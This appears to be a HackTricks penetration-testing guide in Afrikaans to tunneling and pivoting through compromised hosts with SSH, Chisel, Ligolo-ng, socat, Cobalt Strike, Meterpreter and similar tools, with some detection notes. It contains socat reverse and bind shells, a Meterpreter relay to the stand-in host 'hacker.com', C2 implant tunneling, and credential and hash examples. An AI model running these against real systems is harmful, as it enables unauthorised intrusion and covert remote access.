# Tunneling en Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-wenk

> [!WARNING]
> Nmap se proxy-ondersteuning is beperk tot TCP-verbindings en beïnvloed nie ping-, poort- of bedryfstelselbespeuringskanderings nie. Wanneer die skandeerder agter ’n SOCKS-proxy is, **skakel gasheerontdekking af** (`-Pn`) en gebruik ’n **TCP-connect-skandering** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Die finale opdrag gebruik Evil-WinRM se `-u`- en `-i`-opsies om die rekening en WinRM-gasheer te identifiseer; die verstek-WinRM-poort is 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH kan X11-verbindings, arbitrêre TCP-poorte en Unix-domeinsokette oor sy geënkripteerde kanaal aanstuur.<sup>[[6]](#references)</sup>

SSH-grafiese verbinding (X)

`-Y` aktiveer vertroude X11-aanstuur en `-C` versoek kompressie vir aangestuurde data.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Maak nuwe poort in SSH-bediener oop --> Ander poort

Remote (`-R`) forwarding luister op die SSH-bediener en koppel aan die plaaslike kant; die eksplisiete bind address bepaal watter koppelvlakke daardie luisterpoort kan bereik.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Plaaslike poort --> Gekompromitteerde gasheer (SSH) --> Third_box:Port

Plaaslike (`-L`) forwarding luister op die kliënt en koppel vanaf die SSH-bedienerkant aan die bestemming.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Plaaslike poort --> Gekompromitteerde gasheer (SSH) --> Enige plek

Dinamiese (`-D`) aanstuur skep ’n plaaslike SOCKS4/SOCKS5-luisteraar waarvan die verbindings vanaf die afgeleë kant geopen word.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop with ProxyJump

`-J`/`ProxyJump` verbind met die teiken via een of meer komma-geskeide springgashere. Aanstuur-opsies geld steeds vir die finale SSH-verbinding, dus maak die SOCKS-luisteraar hieronder verbindings na bestemmings vanaf `internal-target` oop, nie vanaf die eerste bastion nie. Dit vermy dat jy by ’n springgasheer aanmeld en daar ’n tweede SSH-kliënt begin.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Host-spesifieke opsies vir jump machines moet in `~/.ssh/config` geplaas word; konfigurasie op die opdragreël wat vir die bestemming bedoel is, word nie outomaties op intermediêre hosts toegepas nie.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Dit is nuttig om reverse shells vanaf interne hosts deur ’n DMZ na jou host te kry:

Die bediener se `GatewayPorts`-instelling bepaal of ’n afgeleë aanstuurverbinding buite loopback mag bind; die verstekwaarde is `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Hierdie root-gebaseerde voorbeeld skep tunneltoestelle op albei gashere. Die bediener moet tun-aanstuur toelaat en die gekose rekening moet toegang tot die tun-toestel hê; `PermitRootLogin yes` is een manier om die `root`-rekening hier te gebruik.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Aktiveer aanstuur aan die bedienerkant

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Stel ’n nuwe roete aan die kliëntkant in.

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Sekuriteit – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 het ’n strict-KEX-uitbreiding bygevoeg om Terrapin se aanval op die integriteit van vroeë vervoer teen te werk. Dateer albei eweknieë op waar moontlik en volg die verskaffer se leiding vir ouer implementerings, eerder as om aan te neem dat ’n aangestuurde kanaal bloot op grond van die weergawe beskerm word.<sup>[[8]](#references)</sup>

## SSHUTTLE

Jy kan alle verkeer na ’n subnetwerk deur ’n gasheer via **ssh** **tunnel**.\
Byvoorbeeld, om alle verkeer wat na 10.10.10.0/24 gaan aan te stuur

`sshuttle` bied deursigtige proxying oor SSH en ondersteun die keuse van subnets en ’n pasgemaakte SSH-opdrag, soos hieronder getoon.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Koppel met ’n private sleutel

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit se `portfwd` ondersteun plaaslike en afgeleë aanstuur, terwyl sy SOCKS-proksimodule bedoel is om met sessieroetes of `autoroute` te werk en in hierdie voorbeelde by verstek op poort 1080 luister.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Plaaslike poort --> Gekompromitteerde gasheer (aktiewe sessie) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Nog ’n manier:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike se Beacon kan SOCKS4a/SOCKS5-verbindings deur ’n Beacon herlei; `rportfwd` bind op die gekompromitteerde gasheer, terwyl `rportfwd_local` die bestemmingsverbinding vanaf die Cobalt Strike-kliënt inisieer.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Maak ’n poort op die Team Server oop op die koppelvlakke wat verkeer deur die Beacon moet stuur.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> In hierdie geval word die port op die Beacon-gasheer oopgemaak, nie op die Team Server nie, en die verkeer word na die Team Server gestuur en van daar af na die aangeduide gasheer:port.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Die reverse-forwarding-handleiding merk die volgende gedrag op:<sup>[[14]](#references)</sup>

- Beacon se reverse port forward is ontwerp om **verkeer na die Team Server te tonnel, nie om tussen individuele masjiene te herlei nie**.
- Verkeer word **binne Beacon se C2-verkeer getonnel**, insluitend P2P-skakels.
- Hoë poorte vermy gewoonlik beperkings op bevoorregte poorte, maar die teiken-OS-beleid en bestaande luisteraars geld steeds.

### rPort2Port local

> [!WARNING]
> In hierdie geval word die **poort op die Beacon-gasheer oopgemaak**, nie op die Team Server nie, en word die **verkeer na die Cobalt Strike-kliënt gestuur** (nie na die Team Server nie) en van daar af na die aangeduide host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - In-process tailnet agter 'n CDN

[BOFScale](https://github.com/NetSPI/BOFscale) laat 'n aangepaste Tailscale-overlay binne 'n Windows C2-implant loop sonder om 'n TUN-driver of diens te installeer. Die drie komponente is 'n asinchroniese CGo `c-shared` `tailscaled` BOF-PE, 'n klein C++ BOF-PE wat met die plaaslike API kommunikeer, en 'n asinchroniese `socksportfwd` TCP-na-SOCKS5-brug.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-versoenbare TS2021 en DERP

Tailscale gebruik normaalweg eie HTTP-opgraderings vir die Noise-gebaseerde TS2021-beheerkanaal en DERP-aflos. BOFScale behou daardie grepe-strome, maar dra dit in RFC 6455-WebSockets oor, met `Sec-WebSocket-Protocol: ts2021` of `derp`, sodat 'n operateurbeheerde Headscale/DERP-oorsprong agter 'n CDN kan sit wat slegs standaard-WebSocket-opgraderings aanvaar. Die aangepaste kliënt probeer TS2021 weer oor WebSockets ná HTTP `500`, probeer DERP weer ná HTTP `426`, en laat die DERP-WebSocket-skakelaar die gasheer se proxy-konfigurasie eerbiedig; die BOF stel `TS_DEBUG_DERP_WS_CLIENT=1` in om die bekende-mislukte eerste poging oor te slaan.<sup>[[53]](#references)[[54]](#references)</sup>

Die CDN en oorsprongproxy moet WebSocket-opgraderings vir `/ts2021` en `/derp` behou, `/key` as gewone HTTP aanstuur, en interne lees-/skryftydverstreke deaktiveer omdat aflossessies onbepaald oop kan bly. Die verskafte Headscale-konfigurasie aktiveer `verify_clients`, publiseer slegs die operateur se ingebedde DERP-kaart, en laat `derp.urls` leeg om terugval na Tailscale-beheerde aflosse te voorkom.<sup>[[53]](#references)[[54]](#references)</sup>

### In-proses-daemon en benoemde-pypbeheer

Tensy dit oorheers word, begin die BOF-ingangspunt `tailscaled` met `-tun=userspace-networking`, `-state mem:`, en `-no-logs-no-support`, en skep dan 'n UUID-benoemde pyp. Dit herlei Go se stdout/stderr deur 'n OS-pyp na die Beacon-uitset-API, sodat die volledige daemon en Go-looptyd inwonend bly, maar toestand en logboeke nie na 'n Tailscale-gids geskryf word nie.<sup>[[53]](#references)[[54]](#references)</sup>

Die liggewigkliënt boots Tailscale se HTTP/1.0-plaaslike API oor daardie pyp na. Dit open die pyp met `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` omdat die daemon se `safesocket`-laag die pypkliënt naboots, stuur `Tailscale-Cap: 125`, en karteer die plaaslike API na `up`, `down`, `status`, roete-advertensies en afsluitbewerkings.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Moenie 'n handmatig gekarteerde Go BOF-PE ontlaai nadat jy die daemon gevra het om af te sluit nie: looptyd- en vullisversamelaar-goroutines kan voortgaan om uit geheue uit te voer wat die laaier ontkarteer. Laat `tailscaled` in 'n opofferbare proses loop en beëindig daardie proses vir finale opruiming.<sup>[[54]](#references)</sup>

### Herlei gasheer-geïnisieerde verkeer deur userspace SOCKS5

Inkomende tailnet-verbindings en geadverteerde subnet-roetes werk binne die userspace-netwerkstapel, maar normale prosesse op die gekompromitteerde gasheer het geen OS-roete na die overlay nie. `socksportfwd` luister daarom op 'n TCP-poort wat vanaf die slagoffer bereik kan word, onderhandel SOCKS5 `NO AUTH` met die daemon se `0.0.0.0:1080`-luisteraar, stuur `CONNECT` vir 'n tailnet-bestemming, en herlei verkeer in albei rigtings asinchronies. Wanneer die teiken 'n MagicDNS-naam is, gebruik dit `ATYP_DOMAIN`, sodat `tailscaled` die naam oplos sonder om dit aan die Windows-resolver bloot te stel.<sup>[[53]](#references)[[54]](#references)</sup>

'n Minimale operateurvloei word hieronder getoon; beide die operateurnodus en implant moet die aangepaste binaries gebruik omdat gewone Tailscale nie deur hierdie CDN-ontwerp kan werk nie.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Die plaaslike aanstuur kan die skynbare verifikasieluisteraar van die relay-nutsding skei: dwing ’n masjien om te verifieer by die gekompromitteerde gasheer se gebonde poort, stuur dit deur die tailnet na `ntlmrelayx`, en relay dit verder na AD CS, LDAP, HTTP, SMB of ’n ander versoenbare teiken. Sien [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) en [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) vir die kwesbaarheidspesifieke stadiums; BOFScale is slegs die vervoerlaag.<sup>[[54]](#references)</sup>

### Opsporing

Soek na die kombinasie eerder as ’n enkele swak aanduiding: ’n Go-runtime in ’n proses wat normaalweg nie op Go gebaseer is nie, ’n UUID-pyp met permissiewe SDDL `D:(A;;GA;;;WD)`, ’n onverwagte `0.0.0.0:1080` SOCKS-luisteraar, en langdurige TLS WebSockets na CDN-adresse. Met TLS-inspeksie, merk `Sec-WebSocket-Protocol: derp` of `ts2021` wanneer die eienaarproses nie ’n gemagtigde `tailscaled`-diens is nie. Die bewaarplek se `bofscale.yar`-reëls verskaf geheuehandtekeninge vir al drie BOF-PE-komponente.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Die projek verskaf webtunnелеindpunte soos `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` en `tunnel.php`; laai een ondersteunde eindpunt op voordat jy die plaaslike proxy begin.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Jy kan dit aflaai vanaf die vrystellingsbladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel dra TCP/UDP-verkeer oor HTTP met behulp van ’n SSH-beskermde verbinding; gebruik versoenbare client/server-bouweergawes en verifieer die opdragsintaksis van die gekose vrystelling.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) dra statiese of dinamiese forwards oor WebSocket, HTTP/2 of WebTransport (HTTP/3 oor QUIC). Huidige builds ondersteun TCP, UDP, Unix-sockets, stdio, SOCKS5, HTTP-proxying en Linux-deursigtige-proxy-listeners in beide forward- en reverse-modusse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Laat die bediener op die aanvaller loop en laat die pivot uitgaande verbind met `-R`. In hierdie rigting word die SOCKS5-listener op die **bediener** geskep, terwyl aangevraagde verbindings uit die **kliënt/pivot**-netwerk ontstaan.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

’n Reverse static forward gebruik dieselfde rigting. Byvoorbeeld, die volgende stel `10.10.10.20:445`, soos deur die pivot bereik, op aanvaller se loopback-poort `8445` bloot:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Uitgaande verkeer- en vervoerdetails

- Voeg `-p http://user:pass@proxy:8080` by die kliënt om deur ’n eksplisiete HTTP-proxy te gaan. Gebruik `socks5h://127.0.0.1:1080` in kliënte soos `curl` (of aktiveer geproxiede DNS in die toepassing) sodat interne name aan die ander kant van die tonnel opgelos word eerder as om na die plaaslike resolver te lek.<sup>[[52]](#references)</sup>
- `wss://` kies TLS-beskermde WebSocket. ’n `https://`-kliënt kies HTTP/2, maar buffering of omskakeling na HTTP/1 deur omgekeerde proxys/CDN’s breek dikwels die tweerigtingstroom; stel die wstunnel-bediener direk beskikbaar wanneer jy hierdie modus toets.<sup>[[52]](#references)</sup>
- `wts://` kies WebTransport oor QUIC. Begin die bediener met `--enable-webtransport` (of ’n `wts://`-luister-URL) en laat UDP op die luisterpoort toe. Hierdie modus kan nie deur ’n konvensionele HTTP `CONNECT`-proxy gaan nie, omdat dié proxy TCP vervoer.<sup>[[52]](#references)</sup>

> [!WARNING]
> Die stroomop-projek waarsku dat die ingeboude selfondertekende sertifikaat nie as privaatheidsbeskerming beskou moet word nie. Gebruik eerder ’n geldige pasgemaakte sertifikaat saam met `--tls-verify-certificate` (of mTLS), hou proxy-luisteraars op loopback tensy afstandtoegang doelbewus is, en tonnel reeds veilige protokolle wanneer vertroulikheid belangrik is.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Die Ligolo-ng-vinnige begin dokumenteer ’n TUN-koppelvlak op die proxy, validering van die agent se sertifikaatvingerafdruk en roete-opstelling vir die getonnelde netwerk.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent-binding en luister

Ligolo-ng kan listeners op die agent byvoeg wat na ’n adres aan die proxy-kant aanstuur, en sy gereserveerde `240.0.0.0/4`-reeks kan gerouteer word om agent-plaaslike dienste te bereik.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Toegang tot die Agent se plaaslike poorte

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot begin die reverse tunnel vanaf die slagoffer en stel ’n SOCKS4-proxy op die aanvaller se loopback-adres beskikbaar; die README dokumenteer ook NTLM-proxy-geloofsbriewe en hash-opsies.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot deur **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombineer adressoorte soos `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` en `PROXY`; die voorbeelde hieronder kombineer daardie gedokumenteerde eindpunte.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port deur socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter deur SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Jy kan ’n **nie-geauthentiseerde proxy** deurkruis met socat se gedokumenteerde PROXY-adrestipe deur hierdie reël in plaas van die laaste een in die slagoffer se konsole uit te voer.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat-tonnel

**/bin/sh console**

Skep sertifikate aan albei kante: Kliënt en Bediener

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Koppel die plaaslike SSH-poort (22) aan poort 443 op die aanvaller se gasheer.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink is PuTTY se opdragreëlverbindingnutsding, met SSH-aanstuuropsies soortgelyk aan `ssh`.<sup>[[22]](#references)</sup>

Gebruik hoofletter `-P` vir die SSH-poort. `-pw` word vir versoenbaarheid behou, maar stel die wagwoord in die proseslys bloot; verkies sleutelverifikasie of `-pwfile` waar moontlik.<sup>[[22]](#references)[[23]](#references)</sup>

Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit ’n SSH-kliënt is, maak die SSH-diens en -poort oop vir die omgekeerde verbinding; die volgende gebruik `-R` om ’n plaaslik toeganklike poort na die aanvaller se masjien aan te stuur.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Gebruik ’n konteks met die toestemmings wat die gasheer vereis wanneer jy aanhoudende `portproxy`-reëls skep of verander. Microsoft dokumenteer die `v4tov4`-vorme vir byvoeging, vertoon en verwydering wat hieronder gebruik word.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Deploying `portproxy` through a scheduled task

Wanneer administratiewe geloofsbriewe beskikbaar is, kan uitvoering met Remote Task Scheduler ’n native-aanstuurreël installeer sonder om ’n toegewyde relay op te laai. Byvoorbeeld, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) kan ’n pivot op TCP/443 laat luister en die verbinding na ’n interne SMB-diens aanstuur.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Die reël is persistent, so lys dit met `netsh interface portproxy show v4tov4` en verwyder dit uitdruklik ná die toetsing. Onthou dat `portproxy` slegs aanstuur verskaf; die gasheer-firewall moet ook die luisterpoort toelaat.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Jy moet **RDP-toegang tot die stelsel hê**.\
Laai af:

SocksOverRDP gebruik Remote Desktop Dynamic Virtual Channels om ’n SOCKS5-verbinding oor ’n bestaande RDP-sessie te dra; die kliëntinprop luister op `127.0.0.1:1080`, terwyl die bedienerkomponent op die RDP-teiken loop.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie hulpmiddel gebruik `Dynamic Virtual Channels` (`DVC`) van die Remote Desktop Service-funksie van Windows. DVC is verantwoordelik vir **die tonneling van pakkies oor die RDP-verbinding**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** soos volg op jou kliëntrekenaar:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Nou kan ons via **RDP** aan die **victim** **koppel** met **`mstsc.exe`**, en behoort ons 'n **prompt** te ontvang wat sê dat die **SocksOverRDP-plugin geaktiveer is**, en dat dit op **127.0.0.1:1080** sal **luister**.

**Koppel** via **RDP** en laai die `SocksOverRDP-Server.exe`-binary op die victim-masjien op en voer dit uit:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Bevestig nou op jou masjien (attacker) dat poort 1080 luister:

```
netstat -antb | findstr 1080
```

Nou kan jy [**Proxifier**](https://www.proxifier.com/) gebruik om die verkeer deur daardie poort te stuur.<sup>[[26]](#references)</sup>

### RDP-virtual-channel-hunting

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) is nog ’n RDP-virtual-channel-tonnel; die verstekkanaalnaam is `rdp2tcp`, hoewel ’n operateur ’n ander naam kan kies.<sup>[[56]](#references)</sup> Kanaalskepping en -sluiting word in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` as gebeurtenis-ID’s **132** en **148** aangeteken. Soek na `rdp2tcp` en seldsame/ewekansige kanaalname, en vergelyk hulle dan met verwagte kanale soos `XPSRD`, `cliprdr` en `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Stuur Windows GUI-toepassings deur ’n proxy

Jy kan Windows GUI-toepassings deur ’n proxy laat navigeer met [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Voeg die IP-adres en poort van die SOCKS-bediener by onder **Profile -> Proxy Servers**.\
Voeg onder **Profile -> Proxification Rules** die naam van die program wat jy deur ’n proxy wil stuur en die verbindings na die IP-adresse wat jy wil proxify by; Proxifier-reëls kan by toepassings, teikenbedieners en poorte pas.<sup>[[27]](#references)</sup>

## Tonnel deur ’n NTLM-proxy

